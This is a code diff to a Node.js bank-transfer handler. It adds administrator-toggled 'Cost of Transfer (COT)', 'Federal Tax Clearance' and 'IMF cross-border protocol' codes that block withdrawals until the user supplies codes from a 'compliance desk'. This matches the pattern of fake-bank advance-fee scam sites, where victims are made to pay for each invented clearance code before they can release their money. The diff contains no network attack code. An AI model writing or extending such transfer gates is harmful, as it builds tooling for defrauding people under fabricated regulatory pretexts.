@@ -65,9 +65,13 @@ async function createTransfer(req, res) {
 
     await conn.beginTransaction();
 
-    // Check Current Balance with FOR UPDATE lock
+    // Check Current Balance & Clearance Requirements with FOR UPDATE lock
     const [accRows] = await conn.execute(
-      `SELECT available_balance, ledger_balance, currency, status 
+      `SELECT available_balance, ledger_balance, currency, status,
+              cot_code, tax_code, imf_code,
+              COALESCE(cot_required, 0) AS cot_required,
+              COALESCE(tax_required, 0) AS tax_required,
+              COALESCE(imf_required, 0) AS imf_required
        FROM accounts 
        WHERE id = ? FOR UPDATE`,
       [accountId]
@@ -82,13 +86,51 @@ async function createTransfer(req, res) {
       });
     }
 
-    const currentBalance = parseFloat(accRows[0].available_balance);
+    const account = accRows[0];
+
+    // Enforce administrative clearance codes if toggled on
+    const { cotCode, taxCode, imfCode } = req.body;
+
+    if (account.cot_required) {
+      if (!cotCode || cotCode.toString().trim().toUpperCase() !== (account.cot_code || '').toString().trim().toUpperCase()) {
+        await conn.rollback();
+        return res.status(400).json({
+          success: false,
+          status: 'INVALID_COT_CODE',
+          message: 'Cost of Transfer (COT) authorization code is invalid or missing. Please request your code from the treasury compliance desk.'
+        });
+      }
+    }
+
+    if (account.tax_required) {
+      if (!taxCode || taxCode.toString().trim().toUpperCase() !== (account.tax_code || '').toString().trim().toUpperCase()) {
+        await conn.rollback();
+        return res.status(400).json({
+          success: false,
+          status: 'INVALID_TAX_CODE',
+          message: 'Federal Tax Clearance certificate code is invalid or missing. Please contact the compliance desk.'
+        });
+      }
+    }
+
+    if (account.imf_required) {
+      if (!imfCode || imfCode.toString().trim().toUpperCase() !== (account.imf_code || '').toString().trim().toUpperCase()) {
+        await conn.rollback();
+        return res.status(400).json({
+          success: false,
+          status: 'INVALID_IMF_CODE',
+          message: 'International Monetary Fund (IMF) cross-border protocol code is invalid or missing. Please contact the compliance desk.'
+        });
+      }
+    }
+
+    const currentBalance = parseFloat(account.available_balance);
     if (currentBalance < totalDeduction) {
       await conn.rollback();
       return res.status(400).json({
         success: false,
         status: 'INSUFFICIENT_FUNDS',
-        message: `Insufficient funds. Available balance: $${currentBalance.toFixed(2)}, Required: $${totalDeduction.toFixed(2)} (including $${fee.toFixed(2)} wire fee).`
+        message: `Insufficient funds. Available balance: ${currentBalance.toFixed(2)}, Required: ${totalDeduction.toFixed(2)} (including ${fee.toFixed(2)} wire fee).`
       });
     }
 
